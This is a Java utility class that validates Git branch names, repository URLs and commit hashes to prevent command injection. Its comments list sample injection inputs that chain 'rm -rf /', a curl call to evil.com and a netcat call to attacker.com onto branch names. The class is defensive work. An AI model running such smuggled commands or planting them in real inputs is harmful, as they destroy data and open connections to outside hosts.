package com.purchasingpower.autoflow.util;

import lombok.extern.slf4j.Slf4j;

/**
 * Validates Git-related user inputs to prevent command injection attacks.
 *
 * SECURITY CRITICAL: This class prevents shell injection when using ProcessBuilder
 * or Runtime.exec() with git commands.
 *
 * Example attack without validation:
 * - User input: branch = "main; rm -rf /"
 * - Vulnerable code: ProcessBuilder("git", "pull", "origin", branch)
 * - Result: Executes "git pull origin main; rm -rf /" → deletes filesystem!
 *
 * Safe patterns enforced:
 * - Branch names: alphanumeric, dash, underscore, slash, dot (RFC 2396)
 * - No shell metacharacters: ; | & $ ` < > ( ) { } [ ] \ " '
 */
@Slf4j
public class GitInputValidator {

    /**
     * Validates a Git branch name to prevent command injection.
     *
     * Allowed characters: a-z A-Z 0-9 / _ . -
     * Examples of valid branches:
     * - main
     * - feature/add-auth
     * - release/1.0.0
     * - hotfix-2024
     *
     * Examples of INVALID branches (command injection attempts):
     * - main; rm -rf /
     * - master && curl http://evil.com
     * - dev | nc attacker.com 1234
     *
     * @param branchName The branch name to validate
     * @throws IllegalArgumentException if branch name is invalid or contains injection characters
     */
    public static void validateBranchName(String branchName) {
        if (branchName == null || branchName.isBlank()) {
            throw new IllegalArgumentException("Branch name cannot be null or blank");
        }

        // Check length (Git supports up to 255 chars, but let's be conservative)
        if (branchName.length() > 200) {
            throw new IllegalArgumentException("Branch name too long (max 200 characters): " + branchName.length());
        }

        // Only allow safe characters: alphanumeric, dash, underscore, slash, dot
        // This prevents ALL shell metacharacters: ; | & $ ` < > ( ) { } [ ] \ " ' etc.
        if (!branchName.matches("^[a-zA-Z0-9/_.-]+$")) {
            log.warn("⚠️ SECURITY: Rejected potentially malicious branch name: {}", branchName);
            throw new IllegalArgumentException(
                    "Invalid branch name. Only alphanumeric characters, dash, underscore, slash, and dot are allowed. " +
                    "Received: " + sanitizeForLogging(branchName)
            );
        }

        // Additional Git-specific validations (from Git documentation)
        // Ref: https://git-scm.com/docs/git-check-ref-format

        // Cannot start or end with slash
        if (branchName.startsWith("/") || branchName.endsWith("/")) {
            throw new IllegalArgumentException("Branch name cannot start or end with '/': " + branchName);
        }

        // Cannot start or end with dot
        if (branchName.startsWith(".") || branchName.endsWith(".")) {
            throw new IllegalArgumentException("Branch name cannot start or end with '.': " + branchName);
        }

        // Cannot contain consecutive slashes
        if (branchName.contains("//")) {
            throw new IllegalArgumentException("Branch name cannot contain consecutive slashes '//': " + branchName);
        }

        // Cannot end with .lock (Git internal file)
        if (branchName.endsWith(".lock")) {
            throw new IllegalArgumentException("Branch name cannot end with '.lock': " + branchName);
        }

        log.debug("✅ Validated branch name: {}", branchName);
    }

    /**
     * Validates a Git repository URL to prevent command injection.
     *
     * Allowed formats:
     * - https://github.com/user/repo
     * - https://github.com/user/repo.git
     * - git@github.com:user/repo.git
     * - https://gitlab.com/group/subgroup/repo
     *
     * Blocked:
     * - URLs with shell metacharacters
     * - file:// URLs (potential local file access)
     * - javascript: URLs (XSS in logs)
     *
     * @param repoUrl The repository URL to validate
     * @throws IllegalArgumentException if URL is invalid or contains injection characters
     */
    public static void validateRepoUrl(String repoUrl) {
        if (repoUrl == null || repoUrl.isBlank()) {
            throw new IllegalArgumentException("Repository URL cannot be null or blank");
        }

        // Check length
        if (repoUrl.length() > 500) {
            throw new IllegalArgumentException("Repository URL too long (max 500 characters): " + repoUrl.length());
        }

        // Must start with https:// or git@ (we don't support http:// for security)
        // Also support ssh:// for enterprise git servers
        if (!repoUrl.startsWith("https://") &&
            !repoUrl.startsWith("git@") &&
            !repoUrl.startsWith("ssh://")) {
            throw new IllegalArgumentException(
                    "Repository URL must start with https://, git@, or ssh://. Received: " + sanitizeForLogging(repoUrl)
            );
        }

        // Block dangerous protocols
        String lowerUrl = repoUrl.toLowerCase();
        if (lowerUrl.startsWith("file://") ||
            lowerUrl.startsWith("javascript:") ||
            lowerUrl.startsWith("data:")) {
            log.warn("⚠️ SECURITY: Rejected dangerous protocol in URL: {}", sanitizeForLogging(repoUrl));
            throw new IllegalArgumentException("Dangerous protocol detected in URL");
        }

        // Check for shell metacharacters (except @ : / . - which are valid in URLs)
        // Block: ; | & $ ` < > ( ) { } [ ] \ " '
        if (repoUrl.matches(".*[;|&$`<>(){}\\[\\]\\\\\"'].*")) {
            log.warn("⚠️ SECURITY: Rejected URL with shell metacharacters: {}", sanitizeForLogging(repoUrl));
            throw new IllegalArgumentException("Repository URL contains invalid characters");
        }

        log.debug("✅ Validated repository URL: {}", repoUrl);
    }

    /**
     * Sanitize potentially malicious input for safe logging.
     * Removes/escapes dangerous characters to prevent log injection.
     *
     * @param input The input string to sanitize
     * @return Sanitized string safe for logging
     */
    private static String sanitizeForLogging(String input) {
        if (input == null) return "null";

        // Truncate if too long
        String sanitized = input.length() > 100 ? input.substring(0, 100) + "..." : input;

        // Replace control characters and shell metacharacters with placeholders
        sanitized = sanitized
                .replaceAll("[\\r\\n]", " ")           // Remove newlines (log injection)
                .replaceAll("[;|&$`<>(){}\\[\\]\\\\]", "?");  // Replace shell chars

        return sanitized;
    }

    /**
     * Validates a Git commit hash (SHA-1 or SHA-256).
     *
     * Valid formats:
     * - Full SHA-1: 40 hex characters (e.g., "a1b2c3d4e5f6...")
     * - Short SHA-1: 7-40 hex characters (e.g., "a1b2c3d")
     * - Full SHA-256: 64 hex characters (for Git 2.29+)
     *
     * @param commitHash The commit hash to validate
     * @throws IllegalArgumentException if commit hash is invalid
     */
    public static void validateCommitHash(String commitHash) {
        if (commitHash == null || commitHash.isBlank()) {
            throw new IllegalArgumentException("Commit hash cannot be null or blank");
        }

        // Must be 7-64 hexadecimal characters
        if (!commitHash.matches("^[a-fA-F0-9]{7,64}$")) {
            log.warn("⚠️ SECURITY: Rejected invalid commit hash: {}", sanitizeForLogging(commitHash));
            throw new IllegalArgumentException("Invalid commit hash. Must be 7-64 hexadecimal characters.");
        }

        log.debug("✅ Validated commit hash: {}", commitHash);
    }
}
